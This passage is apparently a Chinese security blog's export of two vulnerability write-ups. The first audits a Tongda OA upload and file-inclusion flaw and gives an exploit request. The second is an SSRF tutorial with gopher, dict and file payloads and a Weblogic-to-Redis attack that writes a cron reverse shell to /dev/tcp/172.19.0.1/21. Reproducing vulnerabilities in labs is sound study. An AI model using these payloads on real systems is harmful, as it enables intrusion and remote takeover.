($_POST as $s_key &#x3D;&gt; $s_value) &#123;</span><br><span class="line">        if (substr($s_key, 0, 7) &#x3D;&#x3D; &#39;_SERVER&#39;) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if ($s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_FORM_HTML_DATA&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_IN&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_OUT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_QTPL_PRCS_SET&#39; || isset($_POST[&#39;ACTION_TYPE&#39;]) &amp;&amp; ($_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;approve_center&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;workflow&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;sms&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;wiki&#39;) &amp;&amp; ($s_key &#x3D;&#x3D; &#39;CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_TPT_CONTENT&#39;)) &#123;</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; $s_key &#x3D;&#x3D; &#39;CONTENT&#39; ? $s_key : substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes($s_value);</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $encoding &#x3D; mb_detect_encoding($s_value, &#39;GBK,UTF-8&#39;);</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes(rich_text_clean($s_value, $encoding));</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reset($_POST);</span><br><span class="line">    $_POST &#x3D; array_merge($_POST, $arr_html_fields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先一开始对 P O S T 长 度 进 行 了 判 断 , 这 里 _POST长度进行了判断,这里 P​OST长度进行了判断,这里_POST实际是一个数组,接着使用foreach函数对数组进行遍历,</li><li>在这里$_POST数组中key为”UPLOAD_MODE”,value为”2”,那么根据配会到</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            &#x2F;&#x2F;直接来这</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br></pre></td></tr></table></figure><ul><li><p>最终数组键名UPLOAD_MODE成了了变量名,而他的对应键值成为了变量值</p></li><li><p>所以 upload.php 未直接接收UPLOAD_MODE值,而我们仍可以传递到这里</p></li><li><p>upload函数的中 调用 add_attach函数，设置$ATTACHMENTS[‘ID’]</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095243732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>再往后 继续跟进函数add_attach，函数同样位于inc/utility_file.php文件下</li><li>找到了保存路径的方式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">function add_attach($SOURCE_FILE, $ATTACH_NAME, $MODULE, $YM, $ATTACH_SIGN, $ATTACH_ID)</span><br><span class="line">&#123;</span><br><span class="line">    $ATTACH_PARA_ARRAY &#x3D; TD::get_cache(&quot;SYS_ATTACH_PARA&quot;);</span><br><span class="line">    $ATTACH_POS_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_POS_ACTIVE&quot;];</span><br><span class="line">    $ATTACH_PATH_ACTIVE &#x3D; $ATTACH_PARA_ARRAY[&quot;SYS_ATTACH_PATH_ACTIVE&quot;];</span><br><span class="line"></span><br><span class="line">    if (!file_exists($SOURCE_FILE)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($MODULE &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $MODULE &#x3D; attach_sub_dir();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($YM &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">        $YM &#x3D; date(&quot;ym&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $ATTACH_PATH_ACTIVE . $MODULE;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $PATH &#x3D; $PATH . &quot;&#x2F;&quot; . $YM;</span><br><span class="line">    if (!file_exists($PATH) || !is_dir($PATH)) &#123;</span><br><span class="line">        @mkdir($PATH, 448);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $ATTACH_NAME &#x3D; (is_default_charset($ATTACH_NAME) ? $ATTACH_NAME : iconv(&quot;utf-8&quot;, MYOA_CHARSET, $ATTACH_NAME));</span><br><span class="line">    $EXT_NAME &#x3D; substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;));</span><br><span class="line">    $ATTACH_NAME &#x3D; str_replace($EXT_NAME, strtolower($EXT_NAME), $ATTACH_NAME);</span><br><span class="line">    $ATTACH_FILE &#x3D; (MYOA_ATTACH_NAME_FORMAT ? md5($ATTACH_NAME) . &quot;.td&quot; : $ATTACH_NAME);</span><br><span class="line">    $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">    $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line"></span><br><span class="line">    if (file_exists($FILENAME)) &#123;</span><br><span class="line">        $ATTACH_ID &#x3D; mt_rand();</span><br><span class="line">        $FILENAME &#x3D; $PATH . &quot;&#x2F;&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $AID &#x3D; mysql_insert_id();</span><br><span class="line">    $ATTACH_ID_NEW &#x3D; $AID . &quot;@&quot; . $YM . &quot;_&quot; . $ATTACH_ID;</span><br><span class="line">    return $ATTACH_ID_NEW;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>可以看到返回值 A T T A C H I D N E W 有 三 部 分 组 成 ATTACH_ID_NEW有三部分组成 ATTACHI​DN​EW有三部分组成AID， Y M ， YM， YM，ATTACH_ID</p></li><li><p>其实UPLOAD_MODE值随便为1，2，3中的任意一个数字，都可以返回文件名字和部分路径，不看也行</p></li></ul><h2 id="文件包含部分"><a href="#文件包含部分" class="headerlink" title="文件包含部分"></a>文件包含部分</h2><ul><li>这个比较简单</li><li>文件包含功能的文件位于webroot\ispirit\interface\gateway.php</li><li>具体代码如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;decode by http:&#x2F;&#x2F;dezend.qiling.org  QQ 2859470</span><br><span class="line"></span><br><span class="line">ob_start();</span><br><span class="line">include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;conn.php&#39;;</span><br><span class="line">include_once &#39;inc&#x2F;utility_org.php&#39;;</span><br><span class="line">if ($P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    if (preg_match(&#39;&#x2F;[^a-z0-9;]+&#x2F;i&#39;, $P)) &#123;</span><br><span class="line">        echo _(&#39;非法参数&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">    if ($_SESSION[&#39;LOGIN_USER_ID&#39;] &#x3D;&#x3D; &#39;&#39; || $_SESSION[&#39;LOGIN_UID&#39;] &#x3D;&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        echo _(&#39;RELOGIN&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if ($json) &#123;</span><br><span class="line">    $json &#x3D; stripcslashes($json);</span><br><span class="line">    $json &#x3D; (array) json_decode($json);</span><br><span class="line">    foreach ($json as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;data&#39;) &#123;</span><br><span class="line">            $val &#x3D; (array) $val;</span><br><span class="line">            foreach ($val as $keys &#x3D;&gt; $value) &#123;</span><br><span class="line">                $&#123;$keys&#125; &#x3D; $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($key &#x3D;&#x3D; &#39;url&#39;) &#123;</span><br><span class="line">            $url &#x3D; $val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($url !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">        if (substr($url, 0, 1) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">            $url &#x3D; substr($url, 1);</span><br><span class="line">        &#125;</span><br><span class="line">        if (strpos($url, &#39;general&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;ispirit&#x2F;&#39;) !&#x3D;&#x3D; false || strpos($url, &#39;module&#x2F;&#39;) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">            include_once $url;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这里的参数也是，POST直接传入就可以了，分析在上面也有主要是有这两个个就可以</p></li><li><pre><code>include_once &apos;inc/session.php&apos;;include_once &apos;inc/conn.php&apos;;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">- 逻辑较为简单，</span><br><span class="line"></span><br><span class="line">- 如果这里不传递参数P为空，就以绕过前面一系列的检测直</span><br><span class="line"></span><br><span class="line">- 随后从json中获取url参数的值</span><br><span class="line"></span><br><span class="line">- 只有 general&#x2F;、ispirit&#x2F;、module&#x2F; 在url内，在直接包含 \$url,</span><br><span class="line"></span><br><span class="line">- 文件包含结束</span><br><span class="line"></span><br><span class="line">构造一个就好了</span><br></pre></td></tr></table></figure>/ispirit/interface/gateway.php?json={&quot;url&quot;:&quot;/general/../../attach/im/2003/1153189608.jpg&quot;}</code></pre></li></ul><p>0x03 修复方案</p><ul><li>更新官方发布的补丁 <a href="http://www.tongda2000.com/news/673.php" target="_blank" rel="noopener">http://www.tongda2000.com/news/673.php</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈SSRF 加redis反弹shell</title>
      <link href="/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2020/03/22/%E6%B5%85%E8%B0%88SSRF%20%E5%8A%A0redis%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-SSRF简介和原理"><a href="#0x00-SSRF简介和原理" class="headerlink" title="0x00 SSRF简介和原理"></a>0x00 SSRF简介和原理</h1><ul><li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种利用漏洞伪造服务器端发起请求。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</li><li>通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。</li></ul><h1 id="0x01-漏洞危害"><a href="#0x01-漏洞危害" class="headerlink" title="0x01 漏洞危害"></a>0x01 漏洞危害</h1><ol><li><p>扫描内网开放服务</p></li><li><p>向内部任意主机的任意端口发送payload来攻击内网服务</p></li><li><p>攻击内网的web应用，例如直接SQL注入、XSS攻击等</p></li><li><p>利用file、gopher、dict协议读取本地文件、执行命令等</p></li></ol><h1 id="0x02-漏洞常出现的地方"><a href="#0x02-漏洞常出现的地方" class="headerlink" title="0x02 漏洞常出现的地方"></a>0x02 漏洞常出现的地方</h1><p>1.社交分享功能：获取超链接的标题等内容进行显示</p><p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3.在线翻译：给网址翻译对应网页的内容</p><p>4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p><p>5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p><p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p><p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p><p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p><p>9.邮件系统：比如接收邮件服务器地址</p><p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p><p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p><p>12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p><h1 id="0x03漏洞验证"><a href="#0x03漏洞验证" class="headerlink" title="0x03漏洞验证"></a>0x03漏洞验证</h1><p>1、排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php\?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</a></p><p>2、dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</p><p>3、抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</p><p>​ 3.1、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>​ 3.2、通过二级域名暴力猜解工具模糊猜测内网地址</p><p>​ 3.3、通过file协议读取内网信息获取相关地址</p><p>4、直接返回的Banner、title、content等信息</p><p>5、留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</p><h1 id="0x04简单的测试用例"><a href="#0x04简单的测试用例" class="headerlink" title="0x04简单的测试用例"></a>0x04简单的测试用例</h1><h3 id="创建一个PHP测试脚本，利用curl发送请求"><a href="#创建一个PHP测试脚本，利用curl发送请求" class="headerlink" title="创建一个PHP测试脚本，利用curl发送请求"></a>创建一个PHP测试脚本，利用curl发送请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$ch &#x3D; curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); </span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0); </span><br><span class="line"></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="利用的多种协议"><a href="#利用的多种协议" class="headerlink" title="利用的多种协议"></a>利用的多种协议</h3><h4 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用gopher协议来查看协议，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_godzzz</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104714726.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用gopher发送POST的请求，</span><br><span class="line">访问：http:&#x2F;&#x2F;localhost&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6667&#x2F;_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104735953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dict 协议探测版本</span><br><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:3306&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322104817808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>FILE协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>http/https协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.211.55.4&#x2F;ssrf.php?url&#x3D;http:&#x2F;&#x2F;ip:port</span><br></pre></td></tr></table></figure><h1 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h1><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><h3 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h3><ul><li>如果内网开放了6379端口redis服务，尝试利用SSRF对redis执行未授权漏洞，可以直接反弹shell获取权限</li><li>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</li><li>因此，此漏洞在没有配置密码的情况下可以利用SSRF来绕过绑定在本地的限制，从而实现在外网攻击内网应用。</li></ul><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><h3 id="参考vulhub的漏洞环境搭建"><a href="#参考vulhub的漏洞环境搭建" class="headerlink" title="参考vulhub的漏洞环境搭建"></a>参考vulhub的漏洞环境搭建</h3><p>装个docker方便的很</p><p>docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">   image: vulhub&#x2F;weblogic</span><br><span class="line">   depends_on:</span><br><span class="line">    - redis</span><br><span class="line">   ports:</span><br><span class="line">    - &quot;7001:7001&quot;</span><br><span class="line"> redis:</span><br><span class="line">   build: .</span><br></pre></td></tr></table></figure><p>编译及启动测试环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<code>http://your-ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用。</p><h3 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h3><p>SSRF漏洞存在于</p><p><code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p><p>1.比如探测自己的 7001端口，这是存在的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020032210495411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2.比如这个 探测 172.19.0.2:6379是否开放，这种报错就是开放的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.19.0.2:6379</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322105012614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>2.比如这个 探测 127.0.0.1:7000是否开放，这种报错就是不存在的端口</p><p><img src="https://img-blog.csdnimg.cn/20200322105029385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="攻击redis（通过header-CRLF-注入）"><a href="#攻击redis（通过header-CRLF-注入）" class="headerlink" title="攻击redis（通过header CRLF 注入）"></a><strong>攻击redis（通过header CRLF 注入）</strong></h3><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><h4 id="查看docker-redis的ip地址"><a href="#查看docker-redis的ip地址" class="headerlink" title="查看docker redis的ip地址"></a><strong>查看docker redis的ip地址</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker exec -it c5e88c76db40 ip addr</span><br><span class="line"></span><br><span class="line">172.19.0.2是docker redis的内网地址</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200322105119457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-A7ZX0fPU-1584844899988)(/Users/zy/Library/Application Support/typora-user-images/image-20200317210632447.png)]"></p><h4 id="利用SSRF漏洞探测内网redis是否开放"><a href="#利用SSRF漏洞探测内网redis是否开放" class="headerlink" title="利用SSRF漏洞探测内网redis是否开放"></a>利用SSRF漏洞探测内网redis是否开放</h4><p>发现redis存在</p><p><img src="https://img-blog.csdnimg.cn/20200322105157613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-AK6eRaxz-1584844899989)(/Users/zy/Library/Application Support/typora-user-images/image-20200317211405238.png)]"></p><h4 id="payload生成"><a href="#payload生成" class="headerlink" title="payload生成"></a>payload生成</h4><p>发送三条redis命令，将弹shell脚本写入<code>/etc/crontab</code>：</p><p>写成计划任务，然后反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line"></span><br><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.19.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure><p>进行url编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 